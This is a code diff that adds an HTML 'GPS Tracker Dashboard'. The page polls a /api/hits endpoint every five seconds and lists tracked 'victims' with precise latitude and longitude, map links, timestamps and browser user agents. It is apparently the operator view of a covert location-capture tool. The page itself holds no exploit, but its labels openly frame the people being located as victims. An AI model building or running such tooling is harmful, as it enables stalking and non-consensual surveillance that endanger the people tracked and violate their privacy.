@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>GPS Tracker Dashboard</title>
+    <style>
+        body{font-family:Arial;background:#1a1a1a;color:#fff;padding:20px}
+        .hit{background:#0f4c75;padding:15px;margin:10px 0;border-radius:8px;cursor:pointer}
+        .hit:hover{background:#1a5f8f}
+        .coords{font-size:18px;font-weight:bold}
+        .map-link{color:#4ade80;text-decoration:none}
+        .live{background:#ef4444;padding:5px;border-radius:4px;font-size:12px}
+        #liveCount{font-size:24px;color:#10b981;margin:20px 0}
+    </style>
+</head>
+<body>
+    <h1>🎯 Live GPS Tracking</h1>
+    <div id="liveCount">Victims tracked: 0</div>
+    <div id="hits"></div>
+
+    <script>
+        let hitCount = 0;
+        async function refreshHits() {
+            const res = await fetch('/api/hits');
+            const hits = await res.json();
+            
+            document.getElementById('liveCount').textContent = `Victims tracked: ${hits.length}`;
+            const hitsDiv = document.getElementById('hits');
+            hitsDiv.innerHTML = hits.slice(-20).map(hit => `
+                <div class="hit">
+                    <div class="live">LIVE</div>
+                    <div class="coords">${hit.lat.toFixed(6)}, ${hit.lon.toFixed(6)}</div>
+                    <a class="map-link" href="${hit.mapsUrl}" target="_blank">🗺️ Open Maps</a><br>
+                    <small>${new Date(hit.timestamp).toLocaleString()} | ${hit.ua.slice(0,50)}...</small>
+                </div>
+            `).join('');
+        }
+        
+        // Refresh every 5 seconds
+        setInterval(refreshHits, 5000);
+        refreshHits(); // Initial load
+    </script>
+</body>
+</html>
